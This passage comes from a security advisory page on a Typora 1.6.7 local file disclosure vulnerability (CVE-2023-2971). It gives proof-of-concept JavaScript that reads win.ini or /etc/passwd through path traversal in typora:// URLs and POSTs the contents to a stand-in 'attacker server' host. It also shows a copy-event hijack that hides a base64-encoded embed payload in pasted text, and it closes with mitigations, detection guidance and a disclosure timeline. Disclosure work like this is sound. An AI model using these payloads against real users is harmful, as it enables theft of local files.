</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;log&#34;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">+=</span> <span class="nx">t</span> <span class="o">+</span> <span class="s1">&#39;\r\n&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;//example.localtest.me/send-file-to-attacker-server&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span><span class="p">,</span> <span class="nx">body</span><span class="o">:</span> <span class="nx">t</span><span class="p">,</span> <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">(</span><span class="s1">&#39;location.origin: &#39;</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">(</span><span class="s1">&#39;navigator.platform: &#39;</span> <span class="o">+</span> <span class="nx">navigator</span><span class="p">.</span><span class="nx">platform</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">log</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">platform</span> <span class="o">===</span> <span class="s1">&#39;Win32&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Content of your C:\\Windows\\win.ini:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;typora://app/typemark/%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;{</span><span class="nx">log</span><span class="p">(</span><span class="nx">r</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Content of your /etc/passwd:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;typora://app/typemark#/../../../../../../../../etc/passwd&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;{</span><span class="nx">log</span><span class="p">(</span><span class="nx">r</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Save the above HTML file as <code>poc1.html</code> and serve it on a webserver, then append this line to any markdown file in Typora: <code>&lt;embed src=&quot;http(s)://YOUR-WEB-SERVER/poc1.html&quot;&gt;</code>. Once the PoC is loaded in the <code>&lt;embed&gt;</code> tag, it will:</p>
<ol>
<li>Try to read <code>C:/Windows/win.ini</code> on Windows, or <code>/etc/passwd</code> on Linux,</li>
<li>Show the content of the file in the webpage,</li>
<li>Send the file to external URL on <code>example.localtest.me</code> (this domain resolves to 127.0.0.1 for demonstration purposes only).</li>
</ol>
<h2 id="attack-scenario">Attack Scenario:<a hidden class="anchor" aria-hidden="true" href="#attack-scenario">#</a></h2>
<h3 id="scenario-1-open-a-malicious-markdown-file">Scenario 1: Open a malicious markdown file<a hidden class="anchor" aria-hidden="true" href="#scenario-1-open-a-malicious-markdown-file">#</a></h3>
<p>An attacker can inject an embed tag in a markdown file and convince the victim to open it in Typora to trigger the payload.</p>
<p>We have attached <code>poc/typora-1.6.7-local-file-disclosure.md</code> with this report for demonstration. It loads poc1.html from <code>https://o.cal1.cn/cab3e723540d9948-typora-167-poc/local-file-disclosure.html</code>. Open the file in affected version of Typora to verify this vulnerability.</p>
<h3 id="scenario-2-copy-and-paste-from-a-webpage">Scenario 2: Copy and paste from a webpage<a hidden class="anchor" aria-hidden="true" href="#scenario-2-copy-and-paste-from-a-webpage">#</a></h3>
<p>An attacker can craft a malicious webpage and hook on the <code>copy</code> event with the following code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;copy&#39;</span><span class="p">,</span><span class="nx">e</span><span class="p">=&gt;{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJodHRwczovL28uY2FsMS5jbi9jYWIzZTcyMzU0MGQ5OTQ4LXR5cG9yYS0xNjctcG9jL2xvY2FsLWZpbGUtZGlzY2xvc3VyZS5odG1sIj4mI3gwZDsmI3gwZDs=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="p">.</span><span class="nx">clipboardData</span><span class="p">.</span><span class="nx">setData</span><span class="p">(</span><span class="s1">&#39;text/markhtml&#39;</span><span class="p">,</span> <span class="sb">`\x20\x0d\x0a\x0d\x0a`</span> <span class="o">+</span> <span class="nx">payload</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">getSelection</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">payload</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">getSelection</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Typora.</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2971_03.Copy-and-Paste.gif" alt=""  />
</p>
<p><em>Note: A live version of copy-and-paste PoC can be found <a href="https://o.cal1.cn/cab3e723540d9948-typora-167-poc/local-file-disclosure-cp.html">here</a>.</em></p>
<h3 id="additional-notes">Additional Notes:<a hidden class="anchor" aria-hidden="true" href="#additional-notes">#</a></h3>
<ol>
<li>It is possible for attackers to set custom styles on the <code>&lt;embed&gt;</code> tag to make the exploit less noticeable. For instance, <code>height:0;</code> is used in the Scenario 2 PoC to hide the embedded webpage.</li>
</ol>
<h2 id="suggested-mitigations">Suggested Mitigations:<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
<p>Prohibit http(s) webpages from accessing <code>typora://</code> resources.</p>
<p>For end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file should not be opened in Typora, and (2) copying text from an untrusted webpage then pasting it into Typora should be avoided.</p>
<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect the exploitation of this vulnerability by checking the presence of <code>embed</code> tags loading suspicious URLs in markdown files.</p>
<h2 id="credits">Credits:<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Li Jiantao (<a href="https://twitter.com/CurseRed">@CurseRed</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline:<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-06-07 Vendor Disclosure</li>
<li>2023-06-07 Initial Vendor Contact</li>
<li>2023-07-18 Vendor Patch Release (1.7.0-dev)</li>
<li>2023-08-19 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-2318/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-2318) MarkText DOM-Based Cross-site Scripting leading to Remote Code Execution</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-3513/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-3513) RazerCentralService unsafe deserialization Escalation of Privilege Vulnerability</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
